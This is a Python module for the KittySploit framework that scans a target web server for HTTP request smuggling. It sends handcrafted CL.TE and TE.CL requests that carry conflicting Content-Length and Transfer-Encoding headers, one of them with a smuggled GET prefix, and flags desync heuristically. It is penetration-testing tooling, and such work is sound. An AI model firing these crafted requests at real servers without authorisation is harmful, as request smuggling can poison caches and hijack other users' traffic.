#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HTTP Request Smuggling scanner: detects desync between front-end and back-end
by sending crafted requests with conflicting Content-Length and Transfer-Encoding.
References: PortSwigger HTTP desync, CWE-444, OWASP.
"""

import socket
import ssl as ssl_module
import time
from kittysploit import *


class Module(Auxiliary):

    __info__ = {
        "name": "HTTP Request Smuggling Scanner",
        "description": "Probes for HTTP request smuggling (CL.TE / TE.CL) by sending crafted requests that front-end and back-end parse differently.",
        "author": "KittySploit Team",
        "tags": ["web", "http", "smuggling", "scanner", "desync"],
        "references": [
            "https://portswigger.net/web-security/request-smuggling",
            "https://cwe.mitre.org/data/definitions/444.html",
        ],
    }

    target = OptString("", "Target host (IP or hostname)", True)
    port = OptPort(443, "Target port", True)
    path = OptString("/", "Request path", True)
    ssl = OptBool(True, "Use SSL/TLS", True, advanced=True)
    timeout = OptInteger(10, "Socket timeout (seconds)", False, advanced=True)
    variant = OptChoice("CL.TE", "Smuggling variant to test", True, ["CL.TE", "TE.CL"])

    def check(self):
        try:
            r = self._raw_request(b"GET " + self.path.encode() + b" HTTP/1.1\r\nHost: " + self._host_header() + b"\r\nConnection: close\r\n\r\n")
            return r is not None and (b"HTTP/" in r[:20] or b"http/" in r[:20])
        except Exception:
            return False

    def _host_header(self):
        p = str(self.port).strip()
        t = str(self.target).strip()
        if (self.ssl and p == "443") or (not self.ssl and p == "80"):
            return t.encode("utf-8", errors="replace")
        return (t + ":" + p).encode("utf-8", errors="replace")

    def _connect(self):
        host = str(self.target).strip()
        port = int(self.port)
        use_ssl = bool(self.ssl) if hasattr(self.ssl, "__get__") else getattr(self, "ssl", True)
        to = int(self.timeout) if self.timeout is not None else 10
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(to)
        sock.connect((host, port))
        if use_ssl:
            ctx = ssl_module.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl_module.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        return sock

    def _raw_request(self, raw_http: bytes) -> bytes:
        try:
            s = self._connect()
            s.sendall(raw_http)
            data = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                except socket.timeout:
                    break
            s.close()
            return data
        except Exception as e:
            if hasattr(self, "framework") and self.framework:
                from core.output_handler import print_error
                print_error(str(e))
            return b""

    def _build_cl_te(self) -> bytes:
        """CL.TE: front-end uses Content-Length, back-end uses Transfer-Encoding. Body length 6 so front-end sees 6 bytes; chunked '0\\r\\n\\r\\n' is 5 bytes, then we smuggle a byte that back-end will treat as start of next request."""
        path = (str(self.path).strip() or "/").encode("utf-8", errors="replace")
        host = self._host_header()
        # Body: "0\r\n\r\n" (5 bytes) + "X" = 6 bytes. Front-end reads 6 and stops. Back-end sees chunked end at 5, then "X" is start of next request.
        body = b"0\r\n\r\nX"
        cl = str(len(body)).encode()
        req = (
            b"POST " + path + b" HTTP/1.1\r\n"
            b"Host: " + host + b"\r\n"
            b"Content-Length: " + cl + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
            + body
        )
        return req

    def _build_te_cl(self) -> bytes:
        """TE.CL: front-end uses Transfer-Encoding, back-end uses Content-Length. Send chunked body that ends with a smuggled request prefix; Content-Length on the inner part."""
        path = (str(self.path).strip() or "/").encode("utf-8", errors="replace")
        host = self._host_header()
        # Chunk 1: "0\r\n\r\n" (chunked end for front-end). Chunk 2: smuggled "GET /404 HTTP/1.1\r\n..." so back-end (using CL) might treat it as next request.
        smuggled = b"GET /404 HTTP/1.1\r\nHost: " + host + b"\r\nX: "
        chunk1 = b"0\r\n\r\n"
        # Second "request" body length (for back-end that ignores TE): we want back-end to read only up to CL bytes; so we put CL: 4 and then 4 bytes, so next recv gets the smuggled line.
        chunk2_len_hex = format(len(smuggled), "x").encode()
        chunk2 = chunk2_len_hex + b"\r\n" + smuggled + b"\r\n"
        body = chunk1 + chunk2
        cl = str(len(body)).encode()
        req = (
            b"POST " + path + b" HTTP/1.1\r\n"
            b"Host: " + host + b"\r\n"
            b"Transfer-Encoding: chunked\r\n"
            b"Content-Length: " + cl + b"\r\n"
            b"Connection: keep-alive\r\n"
            b"\r\n"
            + body
        )
        return req

    def run(self):
        from core.output_handler import print_status, print_success, print_error, print_warning

        target = str(self.target).strip()
        if not target:
            print_error("Target is not set.")
            return

        port = int(self.port)
        path = str(self.path).strip() or "/"
        variant = str(self.variant).strip() if self.variant else "CL.TE"

        print_status(f"Testing HTTP request smuggling: {target}:{port}{path} (variant: {variant})")

        if not self.check():
            print_error("Target not reachable or not HTTP.")
            return

        if variant.upper() == "CL.TE":
            raw = self._build_cl_te()
        else:
            raw = self._build_te_cl()

        print_status("Sending crafted request...")
        t0 = time.time()
        resp = self._raw_request(raw)
        elapsed = time.time() - t0

        if not resp:
            print_error("No response received.")
            return

        # Heuristic: timeouts or connection closure can indicate back-end desync; 404 in response might indicate our smuggled GET /404 was executed
        first_line = resp.split(b"\r\n")[0] if b"\r\n" in resp else resp[:80]
        status = first_line.decode("utf-8", errors="replace")

        if b"404" in resp and variant.upper() == "TE.CL":
            print_success(f"Possible TE.CL smuggling: response suggests smuggled request was processed (404 seen). Check manually.")
        to_val = int(self.timeout) if self.timeout is not None else 10
        if elapsed > (float(to_val) * 0.8):
            print_warning(f"Slow response ({elapsed:.2f}s) - possible desync. Verify with manual tests.")
        else:
            print_status(f"Response: {status.strip()}. No clear smuggling indicator; target may not be vulnerable or variant may differ. Try both CL.TE and TE.CL.")

        print_status("Done. Use Burp Suite or manual requests for full confirmation.")
